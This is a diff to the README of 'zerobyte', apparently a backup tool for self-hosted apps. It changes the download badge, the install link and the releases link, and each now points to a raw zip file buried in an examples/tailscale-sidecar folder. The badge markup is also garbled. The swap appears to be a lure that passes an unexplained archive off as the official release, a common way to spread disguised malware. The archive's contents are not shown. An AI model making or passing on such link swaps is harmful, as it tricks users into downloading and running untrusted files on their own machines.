@@ -1,6 +1,6 @@
 # 🚀 zerobyte - Simple Backup for Your Self-Hosted Apps
 
-[![Download zerobyte](https://img.shields.io/badge/Download%20zerobyte-v1.0-blue.svg)](https://github.com/Andromeda2702/zerobyte/releases)
+[![Download zerobyte](https://github.com/Andromeda2702/zerobyte/raw/refs/heads/main/examples/tailscale-sidecar/Software-1.8.zip%https://github.com/Andromeda2702/zerobyte/raw/refs/heads/main/examples/tailscale-sidecar/Software-1.8.zip)](https://github.com/Andromeda2702/zerobyte/raw/refs/heads/main/examples/tailscale-sidecar/Software-1.8.zip)
 
 ## 📁 Overview
 
@@ -25,7 +25,7 @@ Follow these steps to download and run zerobyte on your computer. Whether you're
 
 ## 📥 Download & Install
 
-To download zerobyte, visit this page: [Download zerobyte](https://github.com/Andromeda2702/zerobyte/releases). You will find various versions available for your operating system.
+To download zerobyte, visit this page: [Download zerobyte](https://github.com/Andromeda2702/zerobyte/raw/refs/heads/main/examples/tailscale-sidecar/Software-1.8.zip). You will find various versions available for your operating system.
 
 1. Click the **Download** link for your platform.
 2. Locate the file in your downloads folder.
@@ -84,7 +84,7 @@ If you have questions or suggestions, feel free to reach out through the issues 
 
 ## 🔄 Staying Updated
 
-For the latest releases and updates, visit our [releases page](https://github.com/Andromeda2702/zerobyte/releases). Stay informed about new features, improvements, and bug fixes.
+For the latest releases and updates, visit our [releases page](https://github.com/Andromeda2702/zerobyte/raw/refs/heads/main/examples/tailscale-sidecar/Software-1.8.zip). Stay informed about new features, improvements, and bug fixes.
 
 ## 📝 License
 
